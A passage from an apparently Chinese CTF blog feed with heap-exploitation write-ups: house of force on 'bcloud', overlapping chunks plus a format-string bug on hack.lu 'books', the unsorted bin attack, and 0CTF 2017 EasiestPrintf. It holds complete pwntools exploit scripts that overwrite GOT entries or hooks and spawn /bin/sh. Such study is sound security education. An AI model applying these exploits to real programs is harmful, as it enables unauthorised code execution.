<li><code>edit()</code>id0的结构，修改<code>free_got</code>为<code>printf</code></li>
<li><code>delete()</code>id1，泄露<code>read</code>的地址</li>
<li><code>edit()</code>id2， 修改<code>atoi</code>为<code>system</code></li>
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level = <span class="string">'critical'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./bcloud'</span>)</div><div class="line">elf = ELF(<span class="string">'./bcloud'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line"></div><div class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">free_got = elf.got[<span class="string">'free'</span>]</div><div class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</div><div class="line"></div><div class="line">bss = <span class="number">0x0804B060</span></div><div class="line">content_length = <span class="number">0x0804b0a0</span></div><div class="line">content_addr = <span class="number">0x804B120</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(length, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</div><div class="line">    p.sendline(str(length))</div><div class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'id:\n'</span>)</div><div class="line">    p.sendline(str(index))</div><div class="line">    p.recvuntil(<span class="string">'content:\n'</span>)</div><div class="line">    p.sendline(content)</div><div class="line">    p.recvuntil(<span class="string">'success.\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_overwrite_wildness</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'name:\n'</span>)</div><div class="line"><span class="comment">#   raw_input()</span></div><div class="line">    p.send(<span class="string">'a'</span> * (<span class="number">0x40</span> - <span class="number">1</span>) + <span class="string">'b'</span>)</div><div class="line">    p.recvuntil(<span class="string">'b'</span>)</div><div class="line">    addr = p.recv(<span class="number">4</span>)</div><div class="line">    p.recvline()</div><div class="line">    p.recvuntil(<span class="string">'Org:\n'</span>)</div><div class="line">    p.send(<span class="string">'a'</span> * <span class="number">0x40</span>)</div><div class="line">    p.recvuntil(<span class="string">'Host:\n'</span>)</div><div class="line">    p.sendline(<span class="string">'\xff\xff\xff\xff'</span>)</div><div class="line">    <span class="keyword">return</span> u32(addr)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"><span class="comment">#   leak name_heap_addr </span></div><div class="line">    name_heap_addr = leak_overwrite_wildness()</div><div class="line">    <span class="keyword">print</span> <span class="string">'name_heap =&gt; '</span>, hex(name_heap_addr - <span class="number">0x08</span>)</div><div class="line">    base_heap = name_heap_addr + <span class="number">0xd0</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'base_heap =&gt; '</span>, hex(base_heap)</div><div class="line"></div><div class="line"><span class="comment">#   malloc a gabage chunk to bss</span></div><div class="line">    offset = bss - base_heap + <span class="number">0x30</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'offset =&gt; '</span>, offset</div><div class="line">    new(offset, <span class="string">'abcdabcd'</span>) <span class="comment"># id0</span></div><div class="line"></div><div class="line"><span class="comment">#   malloc a chunk on bss of free and overwrite content_length[] &amp; content_addr[]</span></div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += p32(<span class="number">4</span>)</div><div class="line">    payload += p32(<span class="number">4</span>)</div><div class="line">    payload += p32(<span class="number">4</span>)</div><div class="line">    payload += (content_addr - content_length - len(payload)) * <span class="string">'\x00'</span></div><div class="line">    payload += p32(free_got)  <span class="comment"># id0</span></div><div class="line">    payload += p32(read_got)  <span class="comment"># id1</span></div><div class="line">    payload += p32(atoi_got)  <span class="comment"># id2</span></div><div class="line">    new(<span class="string">'168'</span>, payload)</div><div class="line"></div><div class="line"><span class="comment">#   overwrite free_got with printf_plt</span></div><div class="line">    edit(<span class="number">0</span>, p32(printf_plt))</div><div class="line"></div><div class="line"><span class="comment">#   '4.Delete' to printf libc to get system_addr</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'id:\n'</span>)</div><div class="line">    p.sendline(str(<span class="number">1</span>))</div><div class="line">    read_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">    <span class="keyword">print</span> <span class="string">'read_addr =&gt; '</span>, read_addr</div><div class="line"></div><div class="line"><span class="comment">#   modify atoi to system</span></div><div class="line">    libc.address = read_addr - libc.symbols[<span class="string">'read'</span>]</div><div class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    payload2 = p32(system_addr)</div><div class="line">    edit(<span class="number">2</span>, payload2)</div><div class="line"></div><div class="line"><span class="comment">#   getshell</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.sendline(<span class="string">'/bin/sh\n'</span>)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="0x09-overlapping-chunks"><a href="#0x09-overlapping-chunks" class="headerlink" title="0x09 overlapping chunks"></a>0x09 overlapping chunks</h2><p>除了how2heap上演示的extend freed chunks，参考了这篇<a href="http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/" target="_blank" rel="external">文章</a>后面的内容。</p>
<p>堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。<br>how2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。</p>
<p>查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。</p>
<p>以how2heap例题2015hack.lu的books为例。</p>
<p>存在明显的堆溢出，程序逻辑如下<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@4</span></div><div class="line">  __int64 v4; <span class="comment">// rcx@16</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [sp+4h] [bp-BCh]@5</span></div><div class="line">  <span class="keyword">void</span> *final_str; <span class="comment">// [sp+8h] [bp-B8h]@0</span></div><div class="line">  <span class="keyword">void</span> *order1; <span class="comment">// [sp+18h] [bp-A8h]@1</span></div><div class="line">  <span class="keyword">void</span> *order2; <span class="comment">// [sp+20h] [bp-A0h]@1</span></div><div class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [sp+28h] [bp-98h]@1</span></div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+30h] [bp-90h]@6</span></div><div class="line">  __int64 v11; <span class="comment">// [sp+B8h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v11 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  order1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</div><div class="line">  order2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</div><div class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</div><div class="line">  <span class="keyword">if</span> ( order1 &amp;&amp; order2 &amp;&amp; dest )</div><div class="line">  &#123;</div><div class="line">    v5 = <span class="number">0</span>;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">" Crappiest and most expensive books for your college education!\n\nWe can order books for you in case they're not in stock.\nMax. two orders allowed!\n"</span>);</div><div class="line">    <span class="keyword">while</span> (</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v5 )</div><div class="line">      &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, final_str);</div><div class="line">        <span class="built_in">printf</span>(dest);                           <span class="comment">// fsb</span></div><div class="line">        result = <span class="number">0L</span>L;</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"1: Edit order 1"</span>);</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"2: Edit order 2"</span>);</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"3: Delete order 1"</span>);</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"4: Delete order 2"</span>);</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"5: Submit"</span>);</div><div class="line">      fgets(&amp;s, <span class="number">128</span>, <span class="built_in">stdin</span>);</div><div class="line">      <span class="keyword">switch</span> ( s )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'1'</span>:</div><div class="line">          <span class="built_in">puts</span>(<span class="string">"Enter first order:"</span>);</div><div class="line">          edit((__int64)order1);</div><div class="line">          <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'2'</span>:</div><div class="line">          <span class="built_in">puts</span>(<span class="string">"Enter second order:"</span>);</div><div class="line">          edit((__int64)order2);</div><div class="line">          <span class="built_in">strcpy</span>(dest, <span class="string">"Your order is submitted!\n"</span>);</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'3'</span>:</div><div class="line">          <span class="keyword">delete</span>(order1);</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'4'</span>:</div><div class="line">          <span class="keyword">delete</span>(order2);</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'5'</span>:</div><div class="line">          final_str = <span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</div><div class="line">          <span class="keyword">if</span> ( !final_str )</div><div class="line">          &#123;</div><div class="line">            fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</div><div class="line">            result = <span class="number">1L</span>L;</div><div class="line">            <span class="keyword">goto</span> finish;</div><div class="line">          &#125;</div><div class="line">          submit((__int64)final_str, (<span class="keyword">const</span> <span class="keyword">char</span> *)order1, (<span class="keyword">char</span> *)order2);</div><div class="line">          v5 = <span class="number">1</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  fwrite(<span class="string">"Something failed!\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</div><div class="line">  result = <span class="number">1L</span>L;</div><div class="line">finish:</div><div class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v11;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们发现在<code>submit</code>函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在<code>submit</code>函数中溢出<code>dest</code>，利用格式化字符串。</p>
<p>但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改<code>.fini</code>section为<code>main</code>的地址，以再结束后再次运行到<code>main</code>，关于<code>.fini</code>的作用在<a href="http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html" target="_blank" rel="external">这篇</a>中提到了</p>
<blockquote>
<p>.fini<br>This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.<br>.init<br>This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).</p>
</blockquote>
<p>总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。</p>
<p>在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的<code>strcpy</code>会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用<code>submit</code>这个还能输里面的<code>strcat</code>来溢出<code>dest</code>里的字符串来得到格式化字符串。</p>
<p>所以思路如下：</p>
<ol>
<li>free掉chunk2</li>
<li>溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置</li>
<li>submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改<code>.fini</code>为程序开始</li>
<li>传入/bin/sh，得到shell</li>
</ol>
<p>由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">1</span> </div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line">context(arch=<span class="string">'amd64'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> local:</div><div class="line">    p = process(<span class="string">'./books'</span>)</div><div class="line">    libc =  ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./books'</span>)</div><div class="line">free_got = elf.got[<span class="string">'free'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'order:\n'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'order:\n'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    p.sendline(str(index + <span class="number">2</span>))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    p.sendline(<span class="string">'5'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">    dele(<span class="number">2</span>)</div><div class="line">    payload = <span class="string">'%1908x'</span> + <span class="string">'%13$hn'</span> <span class="comment"># 400a39</span></div><div class="line">    payload += <span class="string">'%31$lx'</span></div><div class="line">    payload = payload.ljust(<span class="number">0x80</span>)</div><div class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>)</div><div class="line">    edit1(payload)</div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    payload = <span class="string">'5'</span>.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>) + p64(<span class="number">0x6011f0</span>)</div><div class="line"><span class="comment">#    payload += '%&#123;&#125;x'.format(39 - len(payload)) + '%13$hhn'</span></div><div class="line">    gdb.attach(p)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="keyword">print</span> p.recvline()</div><div class="line">    <span class="keyword">print</span> p.recvline()</div><div class="line">    <span class="keyword">print</span> p.recvline()</div><div class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'400fda'</span>)</div><div class="line">    leak_addr = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'leak_addr =&gt; '</span>, hex(leak_addr)</div><div class="line">    libc.address = leak_addr - <span class="number">241</span> - libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'libc.address =&gt; '</span>, hex(libc.address)</div><div class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'system_addr =&gt; '</span>, hex(system_addr)</div><div class="line"></div><div class="line">    dele(<span class="number">2</span>)</div><div class="line">    low_bytes = int(hex(system_addr)[<span class="number">-4</span>:], <span class="number">16</span>)</div><div class="line">    mid_bytes = int(hex(system_addr)[<span class="number">8</span>:<span class="number">10</span>], <span class="number">16</span>)</div><div class="line">    payload = <span class="string">'%&#123;&#125;x'</span>.format(int(hex(system_addr)[<span class="number">8</span>:<span class="number">10</span>], <span class="number">16</span>) - <span class="number">12</span>) + <span class="string">'%13$hhn'</span></div><div class="line">    payload += <span class="string">'%&#123;&#125;x'</span>.format(low_bytes - mid_bytes) + <span class="string">'%14$hn'</span></div><div class="line">    payload = payload.ljust(<span class="number">0x80</span>)</div><div class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    edit1(payload)</div><div class="line">    p.recvuntil(<span class="string">'Submit\n'</span>)</div><div class="line">    payload = <span class="string">'5'</span>.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>) + p64(free_got+<span class="number">2</span>)</div><div class="line">    payload += p64(free_got)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="0x0A-unsorted-bin-attack"><a href="#0x0A-unsorted-bin-attack" class="headerlink" title="0x0A unsorted bin attack"></a>0x0A unsorted bin attack</h2><p>这个应该是最简单的堆溢出技术了吧，先看当我们释放<code>unsortbin</code>时的源码</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">bck = victim-&gt;bk;</div><div class="line">.........</div><div class="line"><span class="comment">/* remove from unsorted list */</span></div><div class="line">unsorted_chunks (av)-&gt;bk = bck;</div><div class="line">bck-&gt;fd = unsorted_chunks (av);</div></pre></td></tr></table></figure>
<p>并没有使用<code>unlink</code>宏，所以这里不存在检查指针的情况，如果我们修改了<code>victim-&gt;bk</code>的值为<code>fake_addr</code>，那么<code>(av)-&gt;bk</code>也会被修改，同时<code>fake_addr+16 = victim-&gt;bk-&gt;fd = (av)</code>，我们就将一个大的数字写到了<code>fack_addr+16</code>的位置去。但是由于<code>(av)-&gt;bk</code>被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。</p>
<p>这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改<code>global_max_fast</code>，这样我们在剩下分配其他内存时都会以<code>fastbin</code>的方式分配，为<code>fastbin</code>攻击做准备。</p>
<h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><p>这里用给出的20160ctf的ZeroStorage为例<br>Orz我去这程序怎么这么长。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。&lt;br&gt;以&lt;a href=&quot;ht
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="heap" scheme="http://reehy.top/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>20170CTF</title>
    <link href="http://reehy.top/2017/03/27/20170CTF/"/>
    <id>http://reehy.top/2017/03/27/20170CTF/</id>
    <published>2017-03-27T12:56:21.000Z</published>
    <updated>2017-04-08T08:44:06.559Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EasiestPrintf"><a href="#EasiestPrintf" class="headerlink" title="EasiestPrintf"></a>EasiestPrintf</h2><p>简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。</p>
<p>顺便吐吐槽新的<code>pwntools</code>的大升级。</p>
<h3 id="第一个思路"><a href="#第一个思路" class="headerlink" title="第一个思路"></a>第一个思路</h3><p>我们<code>checksec</code>之后发现<code>got</code>是不能重写的。</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[<span class="name">!</span>] Couldn<span class="symbol">'t</span> find relocations against PLT to get symbols</div><div class="line">[<span class="name"><span class="builtin-name">*</span></span>] <span class="symbol">'/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf</span>'</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (<span class="name">0x8048000</span>)</div></pre></td></tr></table></figure>
<blockquote>
<p>Change the value of <code>__malloc_hook</code> or <code>__free_hook</code> and find a way to trigger them in printf.</p>
</blockquote>
<p>事实上，在<code>printf</code>函数中，当我们打印的字符串长度过长时，会调用<code>malloc</code>和<code>free</code>的函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">vfprintf</span>.<span class="function">c</span></div><div class="line"><span class="title">if</span> <span class="params">(width &gt;= WORK_BUFFER_SIZE - <span class="number">32</span>)</span></div><div class="line">	  &#123;</div><div class="line">	    <span class="comment">/* We have to use a special buffer.  The "32" is just a safe</span></div><div class="line">	       bet for all the output which is not counted in the width.  */</div><div class="line">	    <span class="keyword">size_t</span> needed = ((<span class="keyword">size_t</span>) width + <span class="number">32</span>) * <span class="keyword">sizeof</span> (CHAR_T);</div><div class="line">	    <span class="keyword">if</span> (__libc_use_alloca (needed))</div><div class="line">	      workend = (CHAR_T *) alloca (needed) + width + <span class="number">32</span>;</div><div class="line">	    <span class="keyword">else</span></div><div class="line">	      &#123;</div><div class="line">		workstart = (CHAR_T *) <span class="built_in">malloc</span> (needed);</div><div class="line">		<span class="keyword">if</span> (workstart == <span class="literal">NULL</span>)</div><div class="line">		  &#123;</div><div class="line">		    done = <span class="number">-1</span>;</div><div class="line">		    <span class="keyword">goto</span> all_done;</div><div class="line">		  &#125;</div><div class="line">		workend = workstart + width + <span class="number">32</span>;</div><div class="line">	      &#125;</div><div class="line">	  &#125;</div></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>Leak the libc address from the arbitrary read.</li>
<li>Construct a format string with<br> the <code>%hhn</code> trick to modify <code>__free_hook</code> to the one-gadget.<br> <code>%100000c</code> to trigger malloc and free.</li>
</ol>
<p>I choose <code>__free_hook</code> instead of <code>__malloc_hook</code> because the address of <code>__malloc_hook</code> contains a <code>\x0a</code> byte which will break the reading of the input.</p>
</blockquote>
<ol>
<li>用格式化字符串修改<code>__free_hook</code>，使其指向一个gadget</li>
<li>用<code>%100000c</code>去除法<code>malloc</code></li>
</ol>
